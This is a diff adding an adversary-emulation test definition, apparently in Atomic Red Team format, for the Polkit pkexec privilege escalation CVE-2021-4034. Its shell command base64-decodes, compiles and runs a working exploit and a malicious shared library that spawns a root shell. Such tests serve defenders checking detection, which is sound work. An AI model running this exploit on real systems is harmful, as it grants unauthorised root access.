@@ -1,0 +1,25 @@
+attack_technique: Test
+display_name: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)
+atomic_tests:
+- name: Test
+  description: Test
+  supported_platforms:
+    - linux
+    - containers
+  input_arguments:
+    Temporary Directory:
+      description: Name of the temporary directory used for this test
+      type: String
+      default: test_polkit_dir
+  executor:
+    command: |
+      mkdir "/tmp/#{Temporary Directory}"; cd "/tmp/#{Temporary Directory}"
+      echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCiNkZWZpbmUgQklOICIvdXNyL2Jpbi9wa2V4ZWMiCiNkZWZpbmUgRElSICJldmlsZGlyIgojZGVmaW5lIEVWSUxTTyAiZXZpbCIKCmludCBtYWluKCkKewogICAgY2hhciAqZW52cFtdID0gewogICAgICAgIERJUiwKICAgICAgICAiUEFUSD1HQ09OVl9QQVRIPS4iLAogICAgICAgICJTSEVMTD1kb2Vzbm90ZXhpc3QiLAogICAgICAgICJDSEFSU0VUPWRvZXNub3RleGlzdCIsCiAgICAgICAgTlVMTAogICAgfTsKICAgIGNoYXIgKmFyZ3ZbXSA9IHsgTlVMTCB9OwoKICAgIHN5c3RlbSgibWtkaXIgR0NPTlZfUEFUSD0uIik7CiAgICBzeXN0ZW0oInRvdWNoIEdDT05WX1BBVEg9Li8iIERJUiAiICYmIGNobW9kIDc3NyBHQ09OVl9QQVRIPS4vIiBESVIpOwogICAgc3lzdGVtKCJta2RpciAiIERJUik7CiAgICBzeXN0ZW0oImVjaG8gJ21vZHVsZVx0SU5URVJOQUxcdFx0XHRkb2Vzbm90ZXhpc3QvL1x0XHRcdCIgRVZJTFNPICJcdFx0XHQyJyA+ICIgRElSICIvZ2NvbnYtbW9kdWxlcyIpOwogICAgc3lzdGVtKCJjcCAiIEVWSUxTTyAiLnNvICIgRElSKTsKCiAgICBleGVjdmUoQklOLCBhcmd2LCBlbnZwKTsKCiAgICByZXR1cm4gMDsKfQo= | base64 -d > polkit_lpe.c
+      echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKdm9pZCBnY29udigpIHt9Cgp2b2lkIGdjb252X2luaXQoKSB7CiAgICBzZXR1aWQoMCk7CiAgICBzZXRnaWQoMCk7CiAgICBzZXRncm91cHMoMCk7CgogICAgZXhlY3ZlKCIvYmluL3NoIiwgTlVMTCwgTlVMTCk7Cn0K | base64 -d > evil-so.c
+      gcc -shared -o evil.so -fPIC -w evil-so.c
+      gcc polkit_lpe.c -w -o polkit_lpe
+      ./polkit_lpe
+    cleanup_command: |
+      rm -r "/tmp/#{Temporary Directory}"
+    name: bash
+    elevation_required: false
